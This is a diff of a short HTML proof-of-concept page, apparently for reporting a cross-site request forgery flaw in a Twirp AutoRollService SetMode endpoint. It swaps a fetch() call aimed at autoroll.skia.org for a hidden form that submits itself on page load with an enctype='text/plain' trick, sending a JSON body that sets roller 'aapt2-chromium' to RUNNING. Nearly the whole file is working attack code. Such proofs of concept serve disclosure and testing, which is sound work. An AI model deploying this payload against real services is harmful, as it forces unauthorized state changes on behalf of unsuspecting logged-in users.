@@ -1,21 +1,13 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <h2>CSRF PoC - Twirp SetMode</h2>
+    <form action="https://myinternalapp/twirp/autoroll.rpc.AutoRollService/SetMode" method="POST" enctype="text/plain">
+      <input type="hidden" name='{"roller_id":"aapt2-chromium","mode":"RUNNING","message":"CSRF_POC"}'>
+    </form>
 
     <script>
-      fetch("https://autoroll.skia.org/twirp/autoroll.rpc.AutoRollService/SetMode", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          roller_id: "aapt2-chromium",
-          mode: "RUNNING",
-          message: "CSRF_ATTACK"
-        })
-      });
+      document.forms[0].submit();
     </script>
-
   </body>
 </html>
+
